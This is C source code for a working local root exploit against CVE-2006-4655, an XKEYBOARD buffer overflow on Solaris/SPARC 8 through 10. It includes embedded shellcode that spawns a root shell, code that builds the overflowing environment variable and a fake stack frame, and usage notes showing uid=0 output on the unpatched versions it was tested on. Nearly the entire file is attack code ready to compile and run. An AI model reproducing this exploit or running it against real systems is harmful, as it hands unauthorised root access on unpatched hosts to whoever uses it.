/*
 * $Id: raptor_xkb.c,v 1.4 2006/10/13 19:03:49 raptor Exp $
 *
 * raptor_xkb.c - XKEYBOARD Strcmp(), Solaris/SPARC 8/9/10
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Buffer overflow in the Strcmp function in the XKEYBOARD extension in X 
 * Window System X11R6.4 and earlier, as used in SCO UnixWare 7.1.3 and Sun 
 * Solaris 8 through 10, allows local users to gain privileges via a long 
 * _XKB_CHARSET environment variable value (CVE-2006-4655).
 *
 * "You certainly do some ninja shit man." -- Kevin Finisterre (0dd)
 *
 * Exploitation on Solaris 8/9 platforms was trivial, while recent Solaris 10 
 * required additional efforts: for some obscure reason traditional return into 
 * the stack doesn't work (SIGSEGV due to FLTBOUNDS?!), sprintf() must be used 
 * instead of strcpy() (the latter has become a leaf function and at least on
 * my test box its address contains a 0x00), and the ld.so.1 memory space 
 * layout has changed a bit. On all platforms, in order for this exploit to 
 * work, the X Window System server DISPLAY specified as argument must have the 
 * XKEYBOARD extension enabled.
 *
 * Greets to Adriano Lima <adriano@risesecurity.org> and Filipe Balestra
 * <filipe_balestra@hotmail.com>, who discovered this vulnerability, and
 * to Ramon de Carvalho Valle <ramon@risesecurity.org>, who exploited it.
 *
 * Usage:
 * $ gcc raptor_xkb.c -o raptor_xkb -ldl -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_xkb 192.168.1.1:0
 * [...]
 * # id
 * uid=0(root) gid=10(staff) egid=3(sys)
 * #
 *
 * Vulnerable platforms:
 * Solaris 8 without patch 119067-03 [tested]
 * Solaris 9 without patch 112785-56 [tested]
 * Solaris 10 without patch 119059-16 [tested]
 */

#include <dlfcn.h>
#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define	INFO1	"raptor_xkb.c - XKEYBOARD Strcmp(), Solaris/SPARC 8/9/10"
#define	INFO2	"Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/dtaction"		// default setuid target
//#define VULN	"/usr/dt/bin/dtprintinfo"
//#define VULN	"/usr/dt/bin/dtsession"

#define	BUFSIZE 1024				// size of the evil buffer
#define	VARSIZE	2048				// size of the evil env var
#define	FFSIZE	64 + 1				// size of the fake frame
#define	DUMMY	0xdeadbeef			// dummy memory address

/* voodoo macros */
#define	VOODOO32(_,__,___)	{_--;_+=(__+___-1)%4-_%4<0?8-_%4:4-_%4;}
#define	VOODOO64(_,__,___)	{_+=7-(_+(__+___+1)*4+3)%8;}

char sc[] = /* Solaris/SPARC shellcode (12 + 12 + 48 = 72 bytes) */
/* double setuid() is needed by dtprintinfo and dtsession */
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
/* execve() */
"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
"\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";

/* globals */
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], var[VARSIZE], ff[FFSIZE];
	char	platform[256], release[256], display[256];
	int	i, offset, ff_addr, sc_addr;
	int	plat_len, prog_len, rel;

	char	*arg[2] = {"foo", NULL};
	int	arg_len = 4, arg_pos = 1;

	int	ret, rwx_mem;

	/* get the stack base */
	int	sb = ((int)argv[0] | 0xffff) & 0xfffffffc;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(2);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* get some system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	rel = atoi(release + 2);

	/* get the address of strcpy() or sprintf() in ld.so.1 */
	ret = (rel < 10 ? search_ldso("strcpy") : search_ldso("sprintf"));

	/* get the address of RWX memory segment inside ld.so.1 */
	rwx_mem = search_rwx_mem();

	/* prepare the evil buffer */
	memset(buf, 'A', sizeof(buf));
	buf[sizeof(buf) - 1] = 0x0;
	memcpy(buf, "_XKB_CHARSET=", 13);

	/* prepare the evil env var */
	memset(var, 'B', sizeof(var));
	var[sizeof(var) - 1] = 0x0;

	/* prepare the fake frame */
	bzero(ff, sizeof(ff));

	/* 
	 * saved %l registers
	 */
	set_val(ff, i  = 0, DUMMY);		/* %l0 */
	set_val(ff, i += 4, DUMMY);		/* %l1 */
	set_val(ff, i += 4, DUMMY);		/* %l2 */
	set_val(ff, i += 4, DUMMY);		/* %l3 */
	set_val(ff, i += 4, DUMMY);		/* %l4 */
	set_val(ff, i += 4, DUMMY);		/* %l5 */
	set_val(ff, i += 4, DUMMY);		/* %l6 */
	set_val(ff, i += 4, DUMMY);		/* %l7 */

	/*
	 * saved %i registers
	 */
	set_val(ff, i += 4, rwx_mem);		/* %i0: 1st arg to function */
	set_val(ff, i += 4, 0x42424242);	/* %i1: 2nd arg to function */
	set_val(ff, i += 4, DUMMY);		/* %i2 */
	set_val(ff, i += 4, DUMMY);		/* %i3 */
	set_val(ff, i += 4, DUMMY);		/* %i4 */
	set_val(ff, i += 4, DUMMY);		/* %i5 */
	set_val(ff, i += 4, sb - 1000);		/* %i6: frame pointer */
	set_val(ff, i += 4, rwx_mem - 8);	/* %i7: return address */

	/* fill the envp, keeping padding */
	sc_addr = add_env(ff);
	add_env(sc);
	add_env(display);
	add_env(buf);
	add_env(var);
	add_env(NULL);

	/* calculate the offset to argv[0] (voodoo magic) */
	plat_len = strlen(platform) + 1;
	prog_len = strlen(VULN) + 1;
	offset = arg_len + env_len + plat_len + prog_len;
	if (rel > 7)
		VOODOO64(offset, arg_pos, env_pos)
	else
		VOODOO32(offset, plat_len, prog_len)

	/* calculate the needed addresses */
	ff_addr = sb - offset + arg_len;
	sc_addr += ff_addr;

	/* set fake frame's %i1 */
	set_val(ff, 36, sc_addr);		/* 2nd arg to function */

	/* fill the evil buffer */
	for (i = 13 + 256; i < 13 + 256 + 56; i += 4) 
		set_val(buf, i, sb - 2048);
	/* we don't need to bruteforce */
	set_val(buf, 13 + 256 + 56, ff_addr);	/* fake frame address */
	set_val(buf, 13 + 256 + 60, ret - 4);	/* function, after the save */

	/* fill the evil env var */
	for (i = 0; i < VARSIZE - 8; i += 4)
		set_val(var, i, sb - 2048);

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using ff address\t: 0x%p\n", (void *)ff_addr);
	fprintf(stderr, "Using function address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(0);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return(env_len);
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return(env_len);
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "Error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_zero(addr - 4, sym);
	return(addr);
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	prmap_t	map;
	int	addr = 0;

	/* open current process map in proc filesystem */
	if ((fd = open("/proc/self/map", O_RDONLY)) < 0) {
		fprintf(stderr, "can't open /proc/self/map\n");
		exit(1);
	}

	/* search for the last RWX memory segment before stack */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_mflags == (MA_READ | MA_WRITE | MA_EXEC))
			addr = map.pr_vaddr;
	close(fd);

	/* add 4 to the exact address NULL bytes */
	if (!(addr & 0xff))
		addr |= 0x04;
	if (!(addr & 0xff00))
		addr |= 0x0400;

	return(addr);
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0xff000000) >> 24;
	buf[pos + 1] =	(val & 0x00ff0000) >> 16;
	buf[pos + 2] =	(val & 0x0000ff00) >> 8;
	buf[pos + 3] =	(val & 0x000000ff);
}
